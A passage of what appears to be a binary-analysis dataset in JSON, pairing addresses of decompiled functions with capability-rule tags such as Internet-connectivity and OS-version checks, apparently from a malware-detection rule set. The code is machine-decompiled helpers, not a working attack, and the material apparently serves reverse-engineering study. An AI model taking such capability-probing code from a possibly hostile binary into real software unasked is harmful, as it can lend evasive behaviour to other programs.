0x800cba48, 1);\n                        if (var_4h == 0) {\n                            puVar4 = fcn.00078b40(iVar1 + 0x24, 0);\n                            *puVar4 = 0x1000;\n                            var_4h = fcn.00078b58(*arg_8h, 1, iVar1 + 0x14, 0);\n                        }\n                    }\n                }\n                if (var_4h != 0) {\n                    fcn.000357f0(*arg_8h);\n                    *arg_8h = 0;\n                }\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 626
    },
    "000373e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000373e0(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.000357f0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "00037470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00037470(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t var_4h;\n    \n    if (arg_ch == 0) {\n        while( true ) {\n            fcn.00037400(arg_8h);\n            iVar1 = fcn.000533b0(arg_8h + 4, 0, 0);\n            if (iVar1 == 0) break;\n            fcn.00037420(arg_8h);\n            for (var_4h = 0; uVar2 = fcn.00078a6e(),  var_4h < uVar2 % 10; var_4h = var_4h + 1) {\n            }\n        }\n    }\n    else if (arg_ch == 1) {\n        while (iVar1 = fcn.000533b0(arg_8h + 4, 1, 0),  iVar1 != 0) {\n            for (var_4h = 0; uVar2 = fcn.00078a6e(),  var_4h < uVar2 % 10; var_4h = var_4h + 1) {\n            }\n        }\n        do {\n            iVar1 = fcn.000533b0(arg_8h, 0, 0);\n        } while (iVar1 != 0);\n    }\n    else if (arg_ch == 2) {\n        fcn.00037400(arg_8h + 8);\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "00037550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00037550(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch == 0) {\n        fcn.00037420(arg_8h);\n    }\n    else if (arg_ch == 1) {\n        fcn.00037420(arg_8h + 4);\n    }\n    else if (arg_ch == 2) {\n        fcn.00037420(arg_8h + 8);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00037590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037590(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_ch == 0) {\n        fcn.00037400(arg_8h);\n        iVar1 = fcn.000533b0(arg_8h + 4, 0, 0);\n        if (iVar1 == 0) {\n            uVar2 = 1;\n        }\n        else {\n            fcn.00037420(arg_8h);\n            uVar2 = 0;\n        }\n    }\n    else if (arg_ch == 1) {\n        iVar1 = fcn.000533b0(arg_8h + 4, 1, 0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.000533b0(arg_8h, 0, 0);\n            if (iVar1 == 0) {\n                uVar2 = 1;\n            }\n            else {\n                fcn.00037420(arg_8h + 4);\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else if (arg_ch == 2) {\n        fcn.00037400(arg_8h + 8);\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 322
    },
    "00037730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037730(int32_t *arg_8h)\n\n{\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = 1;\n    }\n    return var_4h;\n}\n",
        "token_count": 82
    },
    "00037760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037760(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00078a62(*arg_8h, 0, 0);\n    if (iVar1 == 0) {\n        if (arg_ch != NULL) {\n            *arg_ch = 0xffffffff;\n        }\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00078a2c(iVar1);\n        fcn.000359a0(uVar2);\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 157
    },
    "00037820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037820(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (**0x8005129c)(*arg_8h, 0, **0x80051200, 0, &var_4h, 0);\n    if (iVar1 == 0) {\n        (**0x800511fc)(var_4h, 0x1f);\n        (**0x800512e0)();\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00078a2c(iVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 162
    },
    "00037880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037880(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_18h;\n    uint var_10h;\n    char *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_10h == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        var_ch = arg_8h;\n        do {\n            cVar1 = *var_ch;\n            var_ch = var_ch + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = fcn.00078b6a(arg_ch, arg_10h * 2 + -2, &var_4h, arg_8h, var_ch - (arg_8h + 1));\n        if (iVar3 == 0) {\n            *(arg_ch + var_4h) = 0;\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 262
    },
    "00037900": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037900(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_18h;\n    uint var_10h;\n    int16_t *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_10h == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        var_ch = arg_8h;\n        do {\n            iVar1 = *var_ch;\n            var_ch = var_ch + 1;\n        } while (iVar1 != 0);\n        iVar3 = fcn.00078b64(arg_ch, arg_10h + -1, &var_4h, arg_8h, (var_ch - (arg_8h + 1) >> 1) << 1);\n        if (iVar3 == 0) {\n            *(arg_ch + var_4h) = 0;\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 270
    },
    "00037980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00037980(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint var_10h;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_4h = arg_8h;\n    do {\n        iVar1 = *var_4h;\n        var_4h = var_4h + 1;\n    } while (iVar1 != 0);\n    return (var_4h - (arg_8h + 1) >> 1) + 1;\n}\n",
        "token_count": 128
    },
    "000379d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.000379d0(char *arg_8h)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_8h;\n    char *var_4h;\n    \n    var_4h = arg_8h;\n    do {\n        cVar1 = *var_4h;\n        var_4h = var_4h + 1;\n    } while (cVar1 != '\\0');\n    return var_4h + (1 - (arg_8h + 1));\n}\n",
        "token_count": 119
    },
    "00037a70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037a70(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint *var_4h;\n    \n    var_10h = fcn.000356c0(0x1a);\n    if (var_10h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        fcn.00037b30(var_10h);\n        var_18h = fcn.00035950(*arg_8h);\n        var_14h = fcn.00035950(arg_8h[1]);\n        var_4h = &var_18h;\n        for (var_8h = 0; var_8h < 8; var_8h = var_8h + 1) {\n            *(var_4h + var_8h) = *(var_4h + var_8h) ^ *(var_10h + var_8h);\n        }\n        var_ch = 10;\n        iVar2 = fcn.00034630(&var_18h, var_10h + 10, 8);\n        *(arg_ch + 4) = var_10h;\n        *(arg_ch + 8) = iVar2 + var_ch;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 343
    },
    "00037f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00037f70(void)\n\n{\n    uint var_f0h;\n    uint var_e8h;\n    uint var_e4h;\n    uint *var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    \n    fcn.0002c000(&var_c8h, 100);\n    fcn.000789c0(&var_f0h, &var_c8h);\n    var_e8h = 0x18;\n    var_e4h = 0;\n    var_dch = 0;\n    var_e0h = &var_f0h;\n    var_d8h = 0;\n    var_d4h = 0;\n    var_cch = fcn.00078aaa(&var_d0h, 2, &var_e8h);\n    if (var_cch == 0) {\n        var_cch = fcn.00078b70(var_d0h, 0);\n        fcn.000789b4(var_d0h);\n    }\n    return var_cch;\n}\n",
        "token_count": 260
    },
    "00038170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x000381b4\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00038170(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch, \n            uint arg_20h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint16_t extraout_var;\n    uint32_t arg_8h_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint32_t uVar7;\n    uint var_b0h;\n    uint var_a8h;\n    uint *var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint *var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_28h;\n    uint *var_1ch;\n    uint var_18h;\n    ushort var_12h;\n    ushort var_10h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x800ce704 == 0) {\n        fcn.00078b16(3, 0x800cd908, 0x20, 0);\n        *0x800ce704 = 1;\n    }\n    if (arg_ch < 8) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00078ad4(&var_28h, 0x80054928, arg_ch);\n    var_1ch = &var_28h;\n    (**0x80051104)(&var_8h);\n    bVar6 = var_8h < *0x800cd918;\n    var_8h = var_8h - *0x800cd918;\n    var_4h = (var_4h - *0x800cd91c) - bVar6;\n    fcn.00036570(&var_8h, &var_18h);\n    if (var_1ch == NULL) {\n        var_98h = 0x800517aa;\n        var_9ch = 0x800517aa;\n    }\n    else {\n        var_9ch = 0x80054930;\n        var_98h = var_1ch;\n    }\n    if (arg_8h == 0) {\n        var_a0h = 0x80054938;\n    }\n    else {\n        var_a0h = 0x80054934;\n    }\n    arg_8h_00 = arg_1ch & 0xffff | extraout_var << 0x10;\n    uVar3 = fcn.00035980(arg_8h_00);\n    uVar3 = uVar3 & 0xffff;\n    uVar7 = arg_18h >> 0x18;\n    uVar4 = arg_18h >> 0x10 & 0xff;\n    uVar5 = arg_18h >> 8 & 0xff;\n    arg_18h = arg_18h & 0xff;\n    arg_14h = arg_14h & 0xffff;\n    uVar2 = fcn.00035980(arg_14h);\n    fcn.00078ad4(&var_90h, 0x80054940, var_18h, var_18h._2_2_, var_12h, var_10h, var_eh, var_ch, var_ah, var_a0h, \n                 var_9ch, var_98h, arg_10h & 0xff, arg_10h >> 8 & 0xff, arg_10h >> 0x10 & 0xff, arg_10h >> 0x18, uVar2, \n                 arg_14h, arg_18h, uVar5, uVar4, uVar7, uVar3, arg_8h_00, arg_20h);\n    var_a4h = &var_90h;\n    do {\n        cVar1 = *var_a4h;\n        var_a4h = var_a4h + 1;\n    } while (cVar1 != '\\0');\n    fcn.00057330(1, &var_90h, var_a4h - (&var_90h + 1));\n    return;\n}\n",
        "token_count": 1028
    },
    "000384c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000384c0(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint var_124h;\n    uint var_11ch;\n    int16_t *var_118h;\n    uint32_t var_114h;\n    uint var_110h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_118h = arg_8h;\n    do {\n        iVar1 = *var_118h;\n        var_118h = var_118h + 1;\n    } while (iVar1 != 0);\n    var_4h = var_118h - (arg_8h + 1) >> 1;\n    var_114h = 0;\n    if ((var_4h < 8) || (0x101 < var_4h)) {\n        uVar2 = 0;\n    }\n    else {\n        fcn.00037900(arg_8h, &var_110h, 0x104);\n        for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n            var_114h = *(&var_110h + var_8h) + var_114h;\n        }\n        *(&var_110h + var_4h) = (var_114h & 0xff) / 0x1a + 'a';\n        *(&var_110h + var_4h + 1) = 'z' - (var_114h & 0xff) % 0x1a;\n        fcn.00037880(&var_110h + var_4h, arg_ch, 2);\n        fcn.00037880(&var_110h + var_4h + 1, arg_10h, 2);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 446
    },
    "00038620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00038620(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00034f40(0x80054990, &var_4h);\n    if (((((((iVar1 == 0) && (iVar1 = fcn.0005cd70(var_4h, 0x8005499c, 0x800ce708),  iVar1 == 0)) &&\n           (iVar1 = fcn.0005cd70(var_4h, 0x800549b8, 0x800ce70c),  iVar1 == 0)) &&\n          ((iVar1 = fcn.0005cd70(var_4h, 0x800549d0, 0x800ce710),  iVar1 == 0 &&\n           (iVar1 = fcn.0005cd70(var_4h, 0x800549f0, 0x800ce714),  iVar1 == 0)))) &&\n         (iVar1 = fcn.0005cd70(var_4h, 0x80054a0c, 0x800ce718),  iVar1 == 0)) &&\n        (((((iVar1 = fcn.0005cd70(var_4h, 0x80054a28, 0x800ce71c),  iVar1 == 0 &&\n            (iVar1 = fcn.0005cd70(var_4h, 0x80054a40, 0x800ce720),  iVar1 == 0)) &&\n           ((iVar1 = fcn.0005cd70(var_4h, 0x80054a54, 0x800ce724),  iVar1 == 0 &&\n            (((iVar1 = fcn.0005cd70(var_4h, 0x80054a64, 0x800ce728),  iVar1 == 0 &&\n              (iVar1 = fcn.0005cd70(var_4h, 0x80054a7c, 0x800ce72c),  iVar1 == 0)) &&\n             (iVar1 = fcn.0005cd70(var_4h, 0x80054a90, 0x800ce730),  iVar1 == 0)))))) &&\n          ((iVar1 = fcn.0005cd70(var_4h, 0x80054aa8, 0x800ce734),  iVar1 == 0 &&\n           (iVar1 = fcn.0005cd70(var_4h, 0x80054ab8, 0x800ce738),  iVar1 == 0)))) &&\n         (iVar1 = fcn.0005cd70(var_4h, 0x80054ad0, 0x800ce73c),  iVar1 == 0)))) &&\n       ((((iVar1 = fcn.0005cd70(var_4h, 0x80054af0, 0x800ce740),  iVar1 == 0 &&\n          (iVar1 = fcn.0005cd70(var_4h, 0x80054b14, 0x800ce744),  iVar1 == 0)) &&\n         ((iVar1 = fcn.0005cd70(var_4h, 0x80054b34, 0x800ce748),  iVar1 == 0 &&\n          (((iVar1 = fcn.0005cd70(var_4h, 0x80054b50, 0x800ce74c),  iVar1 == 0 &&\n            (iVar1 = fcn.0005cd70(var_4h, 0x80054b6c, 0x800ce750),  iVar1 == 0)) &&\n           (iVar1 = fcn.0005cd70(var_4h, 0x80054b88, 0x800db868),  iVar1 == 0)))))) &&\n        (((iVar1 = fcn.0005cd70(var_4h, 0x80054ba4, 0x800db880),  iVar1 == 0 &&\n          (iVar1 = fcn.0005cd70(var_4h, 0x80054bc4, 0x800db874),  iVar1 == 0)) &&\n         ((iVar1 = fcn.0005cd70(var_4h, 0x80054be0, 0x800db884),  iVar1 == 0 &&\n          (((iVar1 = fcn.0005cd70(var_4h, 0x80054c00, 0x800db86c),  iVar1 == 0 &&\n            (iVar1 = fcn.0005cd70(var_4h, 0x80054c14, 0x800db870),  iVar1 == 0)) &&\n           ((iVar1 = fcn.0005cd70(var_4h, 0x80054c28, 0x800db87c),  iVar1 == 0 &&\n            ((iVar1 = fcn.0005cd70(var_4h, 0x80054c44, 0x800db878),  iVar1 == 0 &&\n             (iVar1 = fcn.0005cd70(var_4h, 0x80054c14, 0x800db870),  iVar1 == 0)))))))))))))) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1207
    },
    "00038a30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00038a30(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00034f40(0x80054c60, &var_4h);\n    if (((((((iVar1 == 0) && (iVar1 = fcn.0005cd70(var_4h, 0x80054c70, 0x800ce754),  iVar1 == 0)) &&\n           (iVar1 = fcn.0005cd70(var_4h, 0x80054c8c, 0x800ce758),  iVar1 == 0)) &&\n          ((iVar1 = fcn.0005cd70(var_4h, 0x80054ca8, 0x800ce75c),  iVar1 == 0 &&\n           (iVar1 = fcn.0005cd70(var_4h, 0x80054cbc, 0x800ce760),  iVar1 == 0)))) &&\n         (iVar1 = fcn.0005cd70(var_4h, 0x80054cd4, 0x800ce764),  iVar1 == 0)) &&\n        (((((iVar1 = fcn.0005cd70(var_4h, 0x80054cec, 0x800ce768),  iVar1 == 0 &&\n            (iVar1 = fcn.0005cd70(var_4h, 0x80054d04, 0x800ce76c),  iVar1 == 0)) &&\n           ((iVar1 = fcn.0005cd70(var_4h, 0x80054d14, 0x800ce770),  iVar1 == 0 &&\n            (((iVar1 = fcn.0005cd70(var_4h, 0x80054d30, 0x800ce774),  iVar1 == 0 &&\n              (iVar1 = fcn.0005cd70(var_4h, 0x80054d40, 0x800ce778),  iVar1 == 0)) &&\n             (iVar1 = fcn.0005cd70(var_4h, 0x80054d54, 0x800ce77c),  iVar1 == 0)))))) &&\n          (((iVar1 = fcn.0005cd70(var_4h, 0x80054d6c, 0x800ce780),  iVar1 == 0 &&\n            (iVar1 = fcn.0005cd70(var_4h, 0x80054d7c, 0x800ce784),  iVar1 == 0)) &&\n           ((iVar1 = fcn.0005cd70(var_4h, 0x80054d90, 0x800ce788),  iVar1 == 0 &&\n            ((((iVar1 = fcn.0005cd70(var_4h, 0x80054dac, 0x800ce78c),  iVar1 == 0 &&\n               (iVar1 = fcn.0005cd70(var_4h, 0x80054dc8, 0x800ce790),  iVar1 == 0)) &&\n              ((iVar1 = fcn.0005cd70(var_4h, 0x80054de0, 0x800ce794),  iVar1 == 0 &&\n               (((iVar1 = fcn.0005cd70(var_4h, 0x80054df8, 0x800ce798),  iVar1 == 0 &&\n                 (iVar1 = fcn.0005cd70(var_4h, 0x80054e20, 0x800db858),  iVar1 == 0)) &&\n                (iVar1 = fcn.0005cd70(var_4h, 0x80054e3c, 0x800db850),  iVar1 == 0)))))) &&\n             ((iVar1 = fcn.0005cd70(var_4h, 0x80054e4c, 0x800db854),  iVar1 == 0 &&\n              (iVar1 = fcn.0005cd70(var_4h, 0x80054e6c, 0x800db85c),  iVar1 == 0)))))))))) &&\n         (iVar1 = fcn.0005cd70(var_4h, 0x80054e8c, 0x800db864),  iVar1 == 0)))) &&\n       (((iVar1 = fcn.0005cd70(var_4h, 0x80054eac, 0x800db860),  iVar1 == 0 &&\n         (iVar1 = fcn.0005cd70(var_4h, 0x80054d90, 0x800ce788),  iVar1 == 0)) &&\n        (iVar1 = fcn.0005cd70(var_4h, 0x80054ec0, 0x800db84c),  iVar1 == 0)))) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1130
    },
    "00038e00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00038e25)\n\nuint __cdecl fcn.00038e00(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    uVar2 = *(arg_ch + 2) + *(arg_ch + 3) & 0x8000000f;\n    var_4h = fcn.000356f0(0xc);\n    if (var_4h == NULL) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        *var_4h = 0;\n        var_4h[1] = arg_ch;\n        var_4h[2] = arg_8h;\n        fcn.00037640(0x800db800, &var_8h, 1);\n        *var_4h = *(uVar2 * 4 + -0x7ff247f4);\n        *(uVar2 * 4 + -0x7ff247f4) = var_4h;\n        fcn.00037670(0x800db800, &var_8h, 1);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 304
    },
    "00038eb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00038ece)\n\nuint __cdecl fcn.00038eb0(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    uVar2 = *(arg_8h + 2) + *(arg_8h + 3) & 0x8000000f;\n    *arg_ch = 0;\n    fcn.00037640(0x800db800, &var_ch, 1);\n    var_8h = NULL;\n    var_4h = *(uVar2 * 4 + -0x7ff247f4);\n    do {\n        if (var_4h == NULL) {\ncode_r0x00038f54:\n            fcn.00037670(0x800db800, &var_ch, 1);\n            if (var_4h == NULL) {\n                uVar1 = 0xc0000001;\n            }\n            else {\n                fcn.000357f0(var_4h);\n                uVar1 = 0;\n            }\n            return uVar1;\n        }\n        if (var_4h[1] == arg_8h) {\n            if (var_8h == NULL) {\n                *(uVar2 * 4 + -0x7ff247f4) = *var_4h;\n            }\n            else {\n                *var_8h = *var_4h;\n            }\n            *arg_ch = var_4h[2];\n            goto code_r0x00038f54;\n        }\n        var_8h = var_4h;\n        var_4h = *var_4h;\n    } while( true );\n}\n",
        "token_count": 407
    },
    "00038f90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00038f90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    *0x800ce7a0 = 0;\n    fcn.00037440(0x800ce7a4);\n    fcn.00078bfa(0x800db800, 0, 0x4c);\n    fcn.00037440(0x800db800);\n    var_1ch = fcn.0003e3c0(arg_8h, &fcn.00038f90::var_ch, &fcn.00038f90::var_18h);\n    if (var_1ch == 0) {\n        (**0x8005104c)(&fcn.00038f90::var_8h, 0x800ce79c, 0x100, 0x50, 0x10);\n        if (var_8h == 0) {\n            var_1ch = fcn.00034f40(0x80054990, &fcn.00038f90::var_10h);\n            if ((((var_1ch == 0) && (var_1ch = fcn.0005cd70(var_10h, 0x80054ed0, &fcn.00038f90::var_14h),  var_1ch == 0)\n                 ) && (var_1ch = fcn.0005cd70(var_10h, 0x80054ef0, &fcn.00038f90::var_20h),  var_1ch == 0)) &&\n               ((var_1ch = fcn.000636c0(var_14h, 0x800795e0, 0x800ce7b0),  var_1ch == 0 &&\n                (var_1ch = fcn.000636c0(var_20h, 0x800792d0, 0x800ce7b4),  var_1ch == 0)))) {\n                fcn.00071080(0x800ce878, 1);\n                var_4h = 0;\n                while ((var_4h < var_18h && (var_ch != 0))) {\n                    var_2ch = *(var_ch + var_4h * 4);\n                    do {\n                        iVar1 = *(var_2ch + 8);\n                        var_2ch = *(iVar1 + 8);\n                        (**0x80051064)(iVar1);\n                        if (var_2ch == 0) break;\n                    } while (iVar1 != var_2ch);\n                    var_1ch = fcn.00039890(0x3915b, *(iVar1 + 0xc), *(var_ch + var_4h * 4));\n                    if ((var_1ch != 0) || (var_1ch = fcn.00039770(*(var_ch + var_4h * 4)),  var_1ch != 0)) break;\n                    var_4h = var_4h + 1;\n                }\n            }\n        }\n        else {\n            var_1ch = var_8h;\n        }\n        if (var_1ch != 0) {\n            fcn.000391b0();\n        }\n        fcn.000357f0(var_ch);\n    }\n    return var_1ch;\n}\n",
        "token_count": 850
    },
    "000391b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
